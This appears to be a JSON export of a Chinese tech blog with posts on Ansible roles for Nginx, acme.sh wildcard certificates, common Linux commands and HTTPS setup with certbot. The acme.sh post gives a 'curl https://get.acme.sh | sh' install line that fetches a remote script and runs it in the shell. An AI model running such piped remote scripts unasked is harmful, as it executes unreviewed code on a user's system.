apt_repository:\n       repo: ppa:nginx/stable\n       state: present\n     register: ppastable\n\n   - name: Install Nginx\n     apt:\n       pkg: nginx\n       state: installed\n       update_cache: true\n     when: ppastable|success\n     notify:\n      - Start Nginx\n\n   - name: Create Web Root\n     file:\n      path: '{{ docroot }}'\n      mode: 775\n      state: directory\n      owner: www-data\n      group: www-data\n     notify:\n      - Reload Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n\n    - name: Reload Nginx\n      service:\n        name: nginx\n        state: reloaded\n```\n\n现在有三个任务：\n\n```bash\nAdd Nginx Repository # 使用apt_repository模块添加Nginx稳定PPA以获取最新的稳定版本的Nginx 。\nInstall Nginx \t\t   # 使用apt模块安装Nginx。\nCreate Web Root      # 最后创建一个Web根目录。\n```\n\n新的register和when指令，可以实现在某些事情发生后让ansible执行任务的功能。\n\n您还可以注册模块操作的结果，并使用定义的变量根据注册（register）的变量值有条件（when）地执行操作。例如，注册通过shell模块运行命令的结果可以让您访问该命令的stdout。\n\n同时还使用了一个变量, docroot变量在定义vars部分。然后将其用作创建定义目录的文件模块的目标参数。需要注意的是，path配置使用括号{{ var-name }}，这是Jinja2的模板。为了使ansible能够在括号内解析Jinja2模板变量，该行必须是单引号或双引号 - 例如，path: '{{ docroot }}' 而不是path: {{ docroot }}。不使用引号将导致错误。 这个playbook可以用通常的命令运行：\n\n```\nansible-playbook -i ./hosts nginx.yml\n```\n\n\n\n### 4. ansible角色（roles）\n\n角色才是ansible的精髓, 每个人可以做出自己的角色让别人使用, 也可以通过ansible-galaxy安装其他人的角色。\n\n角色很适合组织多个相关任务并封装完成这些任务所需的数据。例如，安装nginx可能涉及添加软件包存储库，安装软件包和设置配置。 \n\n此外，真实的配置通常需要额外的数据，如变量，文件，动态模板等等。这些工具可以与Playbook一起使用，但是我们可以通过将相关任务和数据组织成一个角色（role， 相关的结构）很快就能做得更好。 \n\n角色有一个这样的目录结构：\n\n```\nroles\n  rolename\n   - files\n   - handlers\n   - meta\n   - templates\n   - tasks\n   - vars\n```\n\n在每个子目录中（eg： files，handlers等等），ansible将自动搜索并读取叫做main.yml的yaml文件。 \n\n接下来我们将分解nginx.yml文件内容为不同的组件，并将每个组件放在相应的目录中，以创建一个更干净，更完整的配置工具集。\n\n\n\n##### 4.1 创建角色（creating a role）\n\n我们可以使用ansible-galaxy命令来创建一个新角色。此工具可用于将角色保存到ansible的公共注册表，但是我通常只是使用它来在本地创建role的基础目录结构。\n\n```bash\ncd ~/ansible-example\nmkdir roles\ncd roles\nansible-galaxy init nginx\n```\n\n目录名称roles是一种惯例，在运行一个playbook时可以用来查找角色。该目录应该始终被命名roles，但并不强制。在roles目录中运行 ansible-galaxy init nginx 命令将创建新角色所需的目录和文件。\n\n我们来看看我们新建的nginx角色的每个部分~/ansible-example/roles/nginx。\n\n##### 4.2.1 文件（files）\n\nfiles目录中没有main.yml文件.  首先，在files目录中，我们可以添加我们要复制到我们的服务器中的文件。对于nginx，我经常复制h5bp的nginx组件配置。我只需从github下载最新的信息，进行一些调整，并将它们放入files目录中。\n\n```\n~/ansible-example\n - roles\n - - nginx\n - - - files\n - - - - h5bp\n```\n\n我们稍后会看到，h5bp配置文件将通过复制模块添加到服务器。\n\n\n\n##### 4.2.2 处理程序（handlers）\n\nhandlers约定必须包含main.yml文件。我们可以把曾经在nginx.yml 剧本中的定义的所有处理程序放入到handlers目录中。\n\nhandlers/main.yml 内容：\n\n```yml\n---\n# handlers file for nginx\n\n- name: Start Nginx\n  service:\n    name: nginx\n    state: started\n\n- name: Reload Nginx\n  service:\n    name: nginx\n    state: reloaded\n```\n\n一旦handlers/main.yml中的处理程序定义好了，我们可以自由地从其他的yaml配置中引用它们。\n\n\n\n##### 4.2.3 元（meta）\n\nmeta目录中约定必须包含main.yml文件。main.yml文件包含role元数据，包含的依赖关系。如果这个角色依赖于另一个角色，我们可以在这里定义。例如，nginx角色取决于安装ssl证书的ssl角色。 \n\nmeta/main.yml 内容：\n\n```yml\n---\ndependencies:\n  - { role: ssl }\n```\n\n如果我调用了“nginx”角色，它将尝试首先运行“ssl”角色。 否则我们可以省略此文件，或将角色定义为没有依赖关系：\n\n```yml\n---\ndependencies: []\n```\n\n\n\n##### 4.2.4 模板（templates）\n\ntemplates目录中没有main.yml文件，只包含.j2后缀的模板文件。 基于python的Jinja2模板引擎（和django的模板引擎很类似），模板文件可以包含模板变量。这里的文件应该以.j2为类型后缀（eg.uwsgi.j2），提倡但是不强制，也可以取其他的名字。\n\n这是一个nginx服务器（“虚拟主机”）配置的例子。请注意，它使用了稍后在vars/main.yml文件中定义的一些变量。 我们的示例中的nginx配置文件位于templates/serversforhackers.com.conf.j2：\n\n```nginx\nserver {\n    # Enforce the use of HTTPS\n    listen 80 default_server;\n    server_name {{ domain }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl default_server;\n\n    root /var/www/{{ domain }}/public;\n    index index.html index.htm index.php;\n\n    access_log /var/log/nginx/{{ domain }}.log;\n    error_log  /var/log/nginx/{{ domain }}-error.log error;\n\n    server_name {{ domain }};\n\n    charset utf-8;\n\n    include h5bp/basic.conf;\n\n    ssl_certificate           {{ ssl_crt }};\n    ssl_certificate_key       {{ ssl_key }};\n    include h5bp/directive-only/ssl.conf;\n\n    location / {\n        try_files $uri $uri/ /index.php$is_args$args;\n    }\n\n    location = /favicon.ico { log_not_found off; access_log off; }\n    location = /robots.txt  { log_not_found off; access_log off; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi.conf;\n        fastcgi_pass unix:/var/run/php7.1-fpm.sock;\n    }\n}\n```\n\n这是一个相当标准的用于php应用程序的Nginx配置。这里有三个变量：`domain` `ssl_crt` `ssl_key` 这三个变量将在变量部分（vars）中定义。\n\n##### 4.2.5 变量（vars）\n\nvars目录包含一个main.yml文件, 在main.yml中我们可以列出将要使用的所有变量。 \n\nvars/main.yml：\n\n```yml\n---\ndomain: serversforhackers.com\nssl_key: /etc/ssl/sfh/sfh.key\nssl_crt: /etc/ssl/sfh/sfh.crt\n```\n\n+ Note:如果您有敏感信息添加到变量文件中，则可以使用ansible-vault加密文件。\n\n\n\n##### 4.2.6 任务（tasks）\n\ntasks目录包含一个main.yml文件, 使用角色时运行的主文件是tasks/main.yml文件。看看我们的用例将会是什么样的：\n\n```yml\n---\n- name: Add Nginx Repository\n  apt_repository:\n    repo: ppa:nginx/stable\n    state: present\n\n- name: Install Nginx\n  apt:\n    pkg: nginx\n    state: installed\n    update_cache: true\n  notify:\n    - Start Nginx # 在handler文件夹里\n\n- name: Add H5BP Config\n  copy:\n    src: h5bp\n    dest: /etc/nginx\n    owner: root\n    group: root\n\n- name: Disable Default Site Configuration\n  file:\n    dest: /etc/nginx/sites-enabled/default\n    state: absent\n\n# `dest` in quotes as a variable is used!\n- name: Add SFH Site Config\n  register: sfhconfig\n  template:\n    src: serversforhackers.com.j2\n    dest: '/etc/nginx/sites-available/{{ domain }}.conf' \n    owner: root\n    group: root\n\n# `src`/`dest` in quotes as a variable is used!\n- name: Enable SFH Site Config\n  file:\n    src: '/etc/nginx/sites-available/{{ domain }}.conf'\n    dest: '/etc/nginx/sites-enabled/{{ domain }}.conf'\n    state: link\n\n# `dest` in quotes as a variable is used!\n- name: Create Web root\n  file:\n    dest: '/var/www/{{ domain }}/public'\n    mode: 775\n    state: directory\n    owner: www-data\n    group: www-data\n  notify:\n    - Reload Nginx\n\n# `dest` in quotes as a variable is used!\n- name: Web Root Permissions\n  file:\n   dest: '/var/www/{{ domain }}'\n   mode: 775\n   state: directory\n   owner: www-data\n   group: www-data\n   recurse: yes\n  notify:\n    - Reload Nginx\n```\n\n这一系列任务使得nginx能被完整的安装。任务按照出现的顺序完成以下工作：\n\n```\n1 添加nginx / stable库\n2 安装并启动nginx\n3 添加H5BP配置文件\n4 从sites-enabled目录中删除文件的符号链接来禁用默认的nginx配置\n5 将serversforhackers.com.conf.j2虚拟主机模板复制到nginx配置中，渲染模板\n6 通过将其符号链接到sites-enabled目录来启用Nginx服务器配置\n7 创建Web根目录\n8 更改项目根目录的权限（递归），该目录位于之前创建的Web根目录之上\n```\n\n有一些新的模块（和一些我们已经涵盖的新用途），包括复制，模板和文件模块。通过设置每个模块的参数，我们可以做一些有趣的事情，例如确保文件“不存在”（如果存在则删除它们）的state: absent，或者通过创建一个文件作为符号链接的state: link。您应该检查每个模块的文档，以查看可以用它们完成哪些有趣和有用的事情。\n\n参加官方文档: https://docs.ansible.com/ansible/latest/modules/\n\n\n\n##### 4.3 运行角色（running the Role）\n\n要对服务器运行一个或多个角色，我们将重新使用另一个playbook。该playbook与roles目录位于同一个目录中，同一层级。当我们用ansible-playbook命令运行的时候需要先cd进入到该目录中。 \n\n让我们创建一个“主”的yaml文件（被ansible-playbook命令执行的文件），该文件定义要使用的角色以及运行它们的主机： 文件~/ansible-example/server.yml位于与roles目录相同的目录中：(注意是和roles目录同层级!!!!!)\n\n```yml\n---\n- hosts: local\n  connection: local\n  roles:\n    - nginx # 这个是你刚才写的nginx role\n```\n\n所以，我们只是定义角色，而不是在本playbook文件中定义所有的变量和任务。角色负责具体细节。然后我们可以运行角色：\n\n```bash\nansible-playbook -i ./hosts server.yml\n```\n\n以下是运行nginx角色的playbook文件的输出：\n\n```bash\nPLAY [all] ********************************************************************\n\nGATHERING FACTS ***************************************************************\nok: [127.0.0.1]\n\nTASK: [nginx | Add Nginx Repository] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Install Nginx] *************************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add H5BP Config] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Disable Default Site] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add SFH Site Config] *******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Enable SFH Site Config] ****************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Create Web root] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Web Root Permissions] ******************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Start Nginx] ***********************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Reload Nginx] **********************************************\nchanged: [127.0.0.1]\n\nPLAY RECAP ********************************************************************\n127.0.0.1                  : ok=8   changed=7   unreachable=0    failed=0\n```\n\n我们将所有各种组件放在一起，形成一致的角色，现在已经安装并配置了nginx！\n\n\n\n### 5. ansible事实(facts)\n\n请注意，运行剧本时的第一行总是“收集事实”。 在运行任何任务之前，ansible将收集有关其配置的系统的信息。这些被称为事实，并且包括广泛的系统信息，如CPU核心数量，可用的ipv4和ipv6网络，挂载的磁盘，Linux发行版等等。\n\n事实在“任务”或“模板”配置中通常很有用。例如，nginx通常设置为使用与cpu内核一样多的工作处理器。知道这一点，您可以选择如下设置nginx.conf.j2文件的模板：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n或者如果你具有多个cpu的服务器，则可以使用：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores * ansible_processor_count }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n所有的ansible facts全局变量都是以“anisble_”为前缀，并且可以在其他任何地方使用。 尝试对你的本地机器运行以下内容以查看可用的事实：\n\n```bash\n# Run against a local server\n# Note that we say to use \"localhost\" instead of defining a hosts file here!\nansible -m setup --connection=local localhost\n\n# Run against a remote server\nansible -i ./hosts remote -m setup\n```\n\n\n\n### 6. ansible遇到的问题总结\n\n+ 遇到角色没有的问题, ERROR! the role 'Stouts.ntp' was not found\n\n  通过ansible-galaxy安装 \n\n  ```\n  ansible-galaxy install stouts.ntp\n  ```\n\n+ ansible的全局配置ansible.cfg\n\n  如默认是否需要输入密码、是否开启sudo认证、action_plugins插件的位置、hosts主机组的位置、是否开启log功能、默认端口、key文件位置等等。\n  \n  参见: https://www.cnblogs.com/paul8339/p/6159220.htm\n\n+ host文件把一个组作为另一个组的子成员 \n\n  ```\n  [atlanta]\n  host1\n  host2\n  \n  [raleigh]\n  host2\n  host3\n  \n  [southeast:children]\n  atlanta\n  raleigh\n  \n  [southeast:vars]\n  some_server=foo.southeast.example.com\n  halon_system_timeout=30\n  self_destruct_countdown=60\n  escape_pods=2\n  \n  [usa:children]\n  southeast\n  northeast\n  southwest\n  northwest\n  ```\n\n  atlanta raleigh将作为southeast子组，继承父组southeast中some_server等变量\n\n  \n\n+ 限制脚本只在指定的ip对应的机器上执行。\n\n   -l <SUBSET>, --limit <SUBSET>\n   \n\t```bash\n   ansible-playbook myplaybook.yml -l 10.11.12.13\n   ```\n\n\n\n+ 打标签归类, 指定归类相关的task\n\n  ```yml\n  ---\n  - include: restart.yml\n    tags:\n      - tag2\n  - include: push.yml\n    tags:\n      - tag1\n  ```\n\n  tags主要目的是单独执行指定的tag，使用-t 或者--tags 表示。旧版本不是这样写的，会直接在include后面加上tags=xxx,但是在新版本的ansible执行时虽然不报错，但是也不执行该tag。\n\n\n\n### 7. 参考资料\n\n+ [非常好的Ansible入门教程（超简单）](https://blog.csdn.net/pushiqiang/article/details/78126063)\n\n+ [Ansible 快速入门](https://www.cnblogs.com/dachenzi/p/8916521.html)\n\n+ [ansible自动化运维教程](https://www.w3cschool.cn/automate_with_ansible/ )\n\n+ https://docs.ansible.com/ansible/latest/modules/ 官方文档 \n\n  \n\n","tags":["ansible"],"categories":["系统"]},{"title":"acme.sh自动更新阿里云aliyun获取Let's Encrypt wildcard通配符SSL证书","url":"%2Fp%2Fee822cec.html","content":"\n\n\n### 1. 证书类型\n\n+ 目前主流的SSL证书主要分为DV SSL(域名型) 、 OV SSL(组织型) 、EV SSL(增强型)。\n\n![1](acme.sh/1.png)\n\n<!-- more -->\n\n+ DV、OV、EV证书在浏览器中显示的区别\n\nDV类型仅在浏览器显示一个小锁，OV和EV类型证书都包含了企业名称信息，但是，EV证书采用了更加严格的认证标准，浏览器在访问时，会在地址栏显示公司名称，地址栏变成绿色。绿的更加让人信任。\n\n![1](acme.sh/2.png)\n\n\n\n### 2. ACME协议\n\nACME全称The Automatic Certificate Management Environment，而[acme.sh](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FNeilpang%2Facme.sh)这个库，则能够在Linux上实现如下功能：\n\n1. 自动向Let's Encrypt申请证书；\n2. 自动调用各大云平台的api接口实现TXT解析配置；\n3. 证书下发后自动部署到nginx；\n4. 利用定时器，每60天自动更新证书，并完成自动部署。\n\n\n\n### 3. 配置证书\n\n##### 3.1 安装acme.sh\n\n```bash\ncurl https://get.acme.sh | sh\n```\n\n这个自动安装过程完成了以下几个步骤：\n\n1. 拷贝sh脚本到~/.acme.sh/\n2. 创建alias别名acme.sh=~/.acme.sh/acme.sh   (`source ~/.bashrc`一下)\n3. 启动定时器 . 可以通过`crontab -l`查看\n\n\n\n##### 3.2 dns验证并安装部署\n\nacme.sh 实现了 acme 协议支持的所有验证协议. 一般有两种方式验证: http 和 dns 验证. 接下来我们说下 dns的验证.\n\n+ 去阿里的控制台找到Ali_Key, Ali_Secret, 执行下面命名\n\n  ```bash\n  export Ali_Key=\"xxxxxxxx\" \n  export Ali_Secret=\"xxxxxxxx\"\n  ```\n\n+ 生成泛域名证书\n\n  ```bash\n  acme.sh --issue -d \"*.liuvv.com\" --dns dns_ali\n  ```\n  在`~/.acme`文件里生成了`*.liuvv.com` 文件夹\n\n+ 配置nginx\n\n  ```nginx\n  server {\n          listen 80 default_server;\n          listen [::]:80 default_server;\n          rewrite ^ https://$http_host$request_uri? permanent; #https跳转到https,永久重定向\n  }\n  \n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n  \n          ssl_certificate \"/etc/nginx/ssl/fullchain.cer\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com.key\";\n  \n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n+ 安装证书\n\n  ```bash\n  sudo ./acme.sh  --installcert  -d  *.liuvv.com   \\\n          --key-file   /etc/nginx/ssl/*.liuvv.com.key \\\n          --fullchain-file /etc/nginx/ssl/fullchain.cer \\\n          --reloadcmd  \"service nginx force-reload\"\n  ```\n\n  + 这里用的是 `service nginx force-reload`, 不是 `service nginx reload`, 据测试, `reload` 并不会重新加载证书, 所以用的 `force-reload`\n  + nginx 的配置 `ssl_certificate` 使用 `/etc/nginx/ssl/fullchain.cer` ，而非 `/etc/nginx/ssl/<domain>.cer` ，否则 [SSL Labs](https://www.ssllabs.com/ssltest/) 的测试会报 `Chain issues Incomplete` 错误。\n\n+ 重新生成证书\n\n  ```bash\n  sudo ./acme.sh --renew -d *.liuvv.com --force\n  ```\n\n  通过这个命令,观看是否自动部署, 并观察证书的到期时间.\n\n\n\n### 4. 参考资料\n\n+ [https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E](https://github.com/Neilpang/acme.sh/wiki/说明)\n\n+ https://www.mustu.cn/acme-shhuo-qu-lets-encrypt-wildcardtong-pei-ssl/\n\n+ https://www.jianshu.com/p/a9f2088e099c\n\n+ https://deepzz.com/post/acmesh-letsencrypt-cert-auto-renew.html","tags":["acme.sh"],"categories":["https"]},{"title":"linux常用命令总结","url":"%2Fp%2F1d063ae7.html","content":"\n\n\n# 1. 查看linux系统信息\n\n### 1.1 查看系统版本\n\n```bash\n#lsb_release -a \nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 16.04.6 LTS\nRelease:        16.04\nCodename:       xenial\n\n#uname -srm  \nLinux 4.15.0-1060-gcp x86_64\n\n#cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"16.04.6 LTS (Xenial Xerus)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 16.04.6 LTS\"\nVERSION_ID=\"16.04\"\nHOME_URL=\"http://www.ubuntu.com/\"\nSUPPORT_URL=\"http://help.ubuntu.com/\"\nBUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\"\nVERSION_CODENAME=xenial\nUBUNTU_CODENAME=xenial\n\n#cat /proc/version\nLinux version 4.15.0-1060-gcp (buildd@lcy01-amd64-028) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #64-Ubuntu SMP Thu Mar 26 03:21:15 UTC 2020\n\n#cat /etc/issue\nUbuntu 16.04.6 LTS \\n \\l\n```\n\n<!-- more -->\n\n### 1.2 查看硬盘内存 CPU\n\n##### 1.2.1 查看硬盘\n\n```bash\n# df -h  查看磁盘空间\nFilesystem      Size  Used Avail Use% Mounted on\nudev            986M     0  986M   0% /dev\ntmpfs           200M   22M  179M  11% /run\n/dev/sda1        29G  5.6G   24G  20% /\n\n\n#fdisk -l  查看Linux中的所有磁盘分区\nDisk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\nDisklabel type: gpt\nDisk identifier: A03F431A-7AE6-406D-B233-EED234598EEE\n\nDevice      Start      End  Sectors  Size Type\n/dev/sda1  227328 62914526 62687199 29.9G Linux filesystem\n/dev/sda14   2048    10239     8192    4M BIOS boot\n/dev/sda15  10240   227327   217088  106M EFI System\n```\n\n##### 1.2.1 查看内存\n\n```bash\n# free -h 查看内存\n              total        used        free      shared  buff/cache   available\nMem:           1.9G        769M        211M         21M        1.0G        1.0G\nSwap:            0B          0B          0B\n```\n\n##### 1.2.2 查看 CPU\n\n```bash\n# lscpu\nArchitecture:          x86_64\nCPU op-mode(s):        32-bit, 64-bit\nByte Order:            Little Endian\nCPU(s):                2\n\n# cat /proc/cpuinfo   查看 CPU 信息\nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 63\nmodel name      : Intel(R) Xeon(R) CPU @ 2.30GHz\nstepping        : 0\nmicrocode       : 0x1\ncpu MHz         : 2300.000\ncache size      : 46080 KB\n\n# cat /proc/cpuinfo| grep \"processor\"| wc -l   查看 CPU 个数\n2\n```\n\n\n\n# 2. 进程端口相关\n\n### 2.1 查询进程\n\n```bash\nps     # displays processes for the current shell.\nps -ef # Display every active process on a Linux system in generic (Unix/Linux) format.\nps -aux # Display all processes in BSD format.\n```\n\n\n\n### 2.2 查询端口\n\n```bash\n#1. 这类命令一定要用sudo\n#2. a: all p: procee, t:tcp, u:udp, l:正在监听的 , n: 禁止域名解析, 只显示数字ip\nsudo netstat -anp | grep 80\nsudo netstat -tunlp | grep 80\n\n\n# 知道进程名字反查端口\nps -ef | grep processName  #得到processID\nnetstat -anp | grep processID #p能显示出进程名和进程id, 过滤得到端口\n\n# 知道端口反查进程名字\nsudo lsof -i :80\n\n# 一个命令搞定\nsudo netstat -anp | grep processID\nsudo netstat -anp | grep processName\n```\n\n\n\n### 2.3 进程管理器\n\n```bash\n# top\ntop - 13:41:19 up 83 days,  2:53,  1 user,  load average: 0.21, 0.85, 0.72\nTasks: 148 total,   1 running, 106 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  7.0 us,  4.1 sy,  0.0 ni, 88.4 id,  0.2 wa,  0.0 hi,  0.3 si,  0.0 st\nKiB Mem :  2040116 total,   212880 free,   789056 used,  1038180 buff/cache\nKiB Swap:        0 total,        0 free,        0 used.  1040512 avail Mem\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n30844 root      20   0  572436 296072  16972 S   4.7 14.5   4235:28 kube-apiserver\n31035 root      20   0  643968  55980  20080 S   4.3  2.7   3362:32 kubelet\n30735 root      20   0 10.121g  67348  10588 S   2.3  3.3   1994:44 etcd\n```\n\n+ 第一行的参数\n\n  **10:59:22**  : 当前系统时间\n   **up 37 days, 20:48**  : 系统累积以及运行的时间\n   **3 users** : 当前用户数量\n   **load average: 0.00,0.00,0.00** : 系统负载的三个数值分别表示的是1分钟，5分钟和15分钟系统负载的平均值\n\n  当CPU完全空闲的时候，平均负荷为0；当CPU工作量饱和的时候，平均负荷为1。n个CPU的电脑，可接受的系统负荷最大为n.0。\n\n+ 第二行的参数\n\n   **Tasks： 112 total** : 进程总数\n   **1 running** : 正常运行的进程数量\n   **121 sleeping** : 休眠的进程数量\n   **0 stopped** : 停止的进程数量\n   **0 zombie** : 僵死进程数量\n\n+ 第三行的参数\n\n  **0.2 us** : 用户进程占用cpu资源的百分比\n   **0.2 sy** : 内核进程占用cpu资源的百分比\n   **0.0 ni** : 用户进程空间内改变过优先级的进程占cpu资源的百分比\n   **99.7 id** : 空闲cpu百分比\n   **0.0 wa** : 等待io的进程占cpu资源的百分比\n   **0.0 hi** : 硬中断占用cpu的百分比\n   **0.0 si**: 软中断占用的百分比\n   **0.0 st** : 虚拟机占用百分比\n\n+ 第四行的意义\n\n  **524280k total** : 交换区内存总容量\n  **0k used** : 交换区内存使用的容量\n  **524280k used**: 交换区空闲的内存容量\n  **848380k cached** : 缓存的交换区总量\n\n+ 进程的意义\n   **PID** : 进程id，标记唯一进程\n   **USER** : 进程用户名\n   **PR** : 优先级\n   **NI** : nice值。负值表示高优先级，正值表示低优先级\n   **VIRT** : 进程使用的虚拟内存的大小\n   **RES** : 指进程除去使用交换区swap的内存，使用的物理内存的大小\n   **SHR** : 进程共享内存的大小\n   **S** : process status 进程状态 。 分别有D R S T Z ,分别表示不可中断的休眠、正在运行、休眠中、暂停或者跟踪状态、僵死状态\n   **%CPU** : cpu的使用量占总cpu时间的百分比\n   **%MEM** : 进程使用的物理内存百分比\n   **TIME+** : 进程使用的CPU时间总计，精确到1/100秒\n   **COMMAND** : 命令或者进程名称\n\n\n\n# 3. 其他\n\n### 设置linux时间和时区\n\n```bash\n# 设置时间\ndate -s \"2015-10-25 15:00:00\"\n\n#设置时区\ntzselect  #命令只告诉你选择的时区的写法，并不会生效。\n在.bashrc添加  export TZ='Asia/Shanghai'\n```\n\n\n\n### 域名查询\n\n```bash\nhost hostname [server]\n[server]：使用不是由/etc/resolv.conf文件定义的DNS服务器IP来查询某台主机的IP。\n\nhost www.baidu.com\nhost www.baidu.com 8.8.8.8\n\nhost google.com #Find the Domain IP Address\nhost -t ns google.com #Find Domain Name Servers, dns\nhost -t cname mail.google.com #Find Domain CNAME Record\nhost -t mx google.com #Find Domain MX Record\nhost -t txt google.com#Find Domain TXT Record\nhost -a google.com #Find All Information of Domain Records and Zones\n```\n\n\n\n\n\n# 5. 参考教程\n\n+ https://linuxtools-rst.readthedocs.io/zh_CN/latest/","tags":["linux"],"categories":["命令"]},{"title":"https协议简介,网站支持https, golang启动https","url":"%2Fp%2Ffcd8becb.html","content":"\n\n### 1. https 协议简介\n\nHTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输。\n\n> SSL历史和版本\n\n1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。\n\n1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。\n\n1996年，SSL 3.0版问世，得到大规模应用。\n\n1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版。\n\n2006年和2008年，TLS进行了两次升级，分别为TLS 1.1版和TLS 1.2版。最新的变动是2011年TLS 1.2的修订版。\n\n\n目前，应用最广泛的是TLS 1.0，接下来是SSL 3.0。但是，主流浏览器都已经实现了TLS 1.2的支持。\n\n---\nTLS 1.0通常被标示为SSL 3.1\n\nTLS 1.1为SSL 3.2，\n\nTLS 1.2为SSL 3.3。\n\n<!-- more -->\n\n\n### 2. https 非对称加密和数字证书\n\n+ HTTPS的数据传输是加密的。实际使用中，HTTPS利用的是对称与非对称加密算法结合的方式。\n\n+ 对称加密，就是通信双方使用一个密钥，该密钥既用于数据加密（发送方），也用于数据解密（接收方）。\n\n+ 非对称加密，使用两个密钥。发送方使用公钥（公开密钥）对数据进行加密，数据接收方使用私钥对数据进行解密。\n\n+ 实际操作中，单纯使用对称加密或单纯使用非对称加密都会存在一些问题，比如对称加密的密钥管理复杂；非对称加密的处理性能低、资源占用高等，因 此HTTPS结合了这两种方式。\n\n+ HTTPS服务端在连接建立过程（ssl shaking握手协议）中，会将自身的公钥发送给客户端。客户端拿到公钥后，与服务端协商数据传输通道的对称加密密钥-对话密钥，随后的这个协商过程则 是基于非对称加密的（因为这时客户端已经拿到了公钥，而服务端有私钥）。\n\n+ 一旦双方协商出对话密钥，则后续的数据通讯就会一直使用基于该对话密钥的对称加密算法了。(对称加密会加快速度)\n\n\n\n上述过程有一个问题，那就是双方握手过程中，如何保障HTTPS服务端发送给客户端的公钥信息没有被篡改呢？实际应用中，HTTPS并非直接传输公钥信息，而是使用携带公钥信息的数字证书来保证公钥的安全性和完整性。\n\n数字证书，又称互联网上的\"身份证\"，用于唯一标识一个组织或一个服务器的，这就好比我们日常生活中使用的\"居民身份证\"，用于唯一标识一个人。\n\n服务端将数字证书传输给客户端，客户端如何校验这个证书的真伪呢？我们知道居民身份证是由国家统一制作和颁发的，个人向户口所在地公安机关申请，国家颁发的身份证才具有法律效力，任何地方这个身份证都是有效和可被接纳的。\n\n网站的证书也是同样的道理。一般来说数字证书从受信的权威证书授权机构 (Certification Authority，证书授权机构)买来的（免费的很少）。一般浏览器在出厂时就内置了诸多知名CA（如Verisign、GoDaddy、美国国防部、 CNNIC等）的数字证书校验方法，只要是这些CA机构颁发的证书，浏览器都能校验。\n\n对于CA未知的证书，浏览器则会报错。主流浏览器都有证书管理功能，但鉴于这些功能比较高级，一般用户是不用去关心的。\n\n\n\n\n### 3. 让自己的网站支持 https\n\n+ 使用 Let’s Encrypt 提供的免费证书, 放到自己的服务器中, 并且在nginx配置好证书路径, 这样使用浏览器访问的时候就会见到熟悉的绿色小锁头了. 需要注意证书必须颁发给`某个域名`, 所以`ip地址`无效.\n\n+ 安装工具certbot\n\n```\ngit clone https://github.com/certbot/certbot\ncd certbot\nchmod +x certbot-auto\n\t\n# certbot-auto 即为自动化脚本工具, 他会判断你的服务是nginx还是apache, 然后执行对应逻辑\n./certbot-auto --help\n```\n\n+ 生成证书\n\n```bash\n# webroot代表webroot根目录模式, certonly代表只生成证书 邮箱亲测没啥大用, 域名一定要和自己要申请证书的域名一致\n./certbot-auto certonly --webroot --agree-tos -v -t --email 你的邮箱 -w 服务器根目录 -d 你要申请的域名\n\t\n\t\n# 实际如下\n./certbot-auto certonly --webroot --agree-tos -v -t --email levonfly@gmail.com -w /var/www/html/ -d a.xuanyueting.com\n```\n\n然后会在/etc/letsencrypt/目录下生成相关文件, 你所需要的证书其实在`/etc/letsencrypt/live/a.xuanyueting.com/`目录中.\n\n`fullchain.pem`可以看作是证书公钥, `privkey.pem`是证书私钥, 是我们下面需要使用到的两个文件\n\n\n+ nginx 配置支持 https\n\n```nginx\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    rewrite ^ https://$http_host$request_uri? permanent;\n}\n\n\nserver {\n\t  listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n    ssl_certificate \"/etc/letsencrypt/live/a.xuanyueting.com/fullchain.pem\";\n    ssl_certificate_key \"/etc/letsencrypt/live/a.xuanyueting.com/privkey.pem\";\n    \n    root /var/www/html;\n    ....\n}\n```\n\n+ 重启 nginx 验证\n\t\n```bash\nsudo service nginx restart\n```\n访问 a.xuanyueting.com, 会发现出现了小绿锁\n\n\n\n### 4. freesn网站免费申请\n\n+ https://freessl.cn/ 注册账号\n\n+ 选择Let's Encrypt V2 支持通配符\n\n  